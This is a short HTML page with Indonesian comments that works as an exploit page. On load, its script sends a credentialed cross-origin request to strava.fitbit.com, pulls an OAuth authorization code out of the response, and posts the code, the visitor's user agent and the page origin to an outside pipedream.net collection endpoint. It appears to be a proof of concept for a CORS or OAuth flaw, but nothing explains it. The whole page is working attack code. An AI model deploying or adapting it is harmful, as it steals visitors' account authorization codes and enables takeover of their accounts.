<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>Ambil kode OAuth dari strava.fitbit.com</title>
  </head>
  <body>
    <h2>Ambil kode OAuth dari strava.fitbit.com</h2>
    <p id="status">Loading...</p>

    <script>
      // Coba ambil response dari strava.fitbit.com
      fetch("https://strava.fitbit.com/auth/fitbit", {
        method: "GET",
        credentials: "include",
        mode: "cors"
      })
        .then(response => response.text())
        .then(text => {
          const match = text.match(/code=([a-zA-Z0-9_-]{10,})/);
          if (match) {
            const code = match[1];
            document.getElementById("status").innerText =
              "✅ Kode berhasil diambil: " + code;

            // Kirim ke pipedream
            fetch("https://eoqb3e0qi0vy2sc.m.pipedream.net", {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({
                source: "fetch.html",
                code: code,
                userAgent: navigator.userAgent,
                documentOrigin: document.location.origin
              })
            });
          } else {
            document.getElementById("status").innerText =
              "Gagal menemukan kode di response.";
          }
        })
        .catch(err => {
          document.getElementById("status").innerText =
            "ERROR: " + err.toString();
        });
    </script>
  </body>
</html>

